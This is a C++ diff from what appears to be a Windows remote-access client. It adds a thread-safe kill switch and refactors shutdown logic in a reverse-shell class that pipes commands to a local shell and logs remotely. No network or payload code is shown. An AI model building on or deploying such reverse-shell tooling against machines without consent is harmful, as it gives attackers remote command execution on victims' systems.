@@ -87,6 +87,17 @@ void Cliente::DestroyClasses() {
     __DBG_("[DC] Clases destruidas");
 }
 
+//Kill swith
+bool Cliente::isKillSwitch() {
+    std::unique_lock<std::mutex> lock(this->mtx_kill);
+    return this->killSwitch;
+}
+
+void Cliente::setKillSwitch(bool _value) {
+    std::unique_lock<std::mutex> lock(this->mtx_kill);
+    this->killSwitch = _value;
+}
+
 Cliente::Cliente() {
     this->Init_Key();
 }
@@ -265,6 +276,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
     //Parar toda operacion que este corriendo
     if (iComando == EnumComandos::CLI_KSWITCH) {
+        //this->setKillSwitch(true);
         this->DestroyClasses();
         return;
     }
@@ -1472,9 +1484,7 @@ void ReverseShell::StopShell() {
 
 void ReverseShell::TerminarShell() {
     
-    std::unique_lock<std::mutex> lock(this->mutex_shell);
-    this->isRunning = false;
-    lock.unlock();
+    this->StopShell();
 
     if (this->tRead.joinable()) {
         this->tRead.join();
@@ -1501,12 +1511,25 @@ void ReverseShell::TerminarShell() {
     }
 }
 
+bool ReverseShell::m_IsRunning() {
+    std::unique_lock<std::mutex> lock(this->mutex_shell);
+    return this->isRunning;
+}
+
 void ReverseShell::thLeerShell(HANDLE hPipe) {
     //int iLen = 0; , iRet = 0;
     char cBuffer[4096], cBuffer2[4096 * 2 + 30];
     DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
     BYTE bPChar = 0;
-    while (this->isRunning) {
+    while (this->m_IsRunning()) {
+        //Kill switch
+        if (cCliente->isKillSwitch()) {
+            __DBG_("[SH] kill_switch...");
+            this->TerminarShell();
+            cCliente->setKillSwitch(false);
+            break;
+        }
+
         if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
             if (dBytesReaded > 0) {
                 ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
@@ -1541,9 +1564,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
 
 void ReverseShell::thEscribirShell(std::string pStrInput) {
     if (pStrInput == "exit\r\n") {
-        std::unique_lock<std::mutex> lock(this->mutex_shell);
-        this->isRunning = false;
-        lock.unlock();
+        this->StopShell();
     }
 
     DWORD dBytesWrited = 0;
@@ -1551,9 +1572,7 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
     if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
         cCliente->m_RemoteLog("[SHELL] WriteFile error: " + std::to_string(GetLastError()));
         __DBG_("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
-        std::unique_lock<std::mutex> lock(this->mutex_shell);
-        this->isRunning = false;
-        lock.unlock();
+        this->StopShell();
     }
 }
 
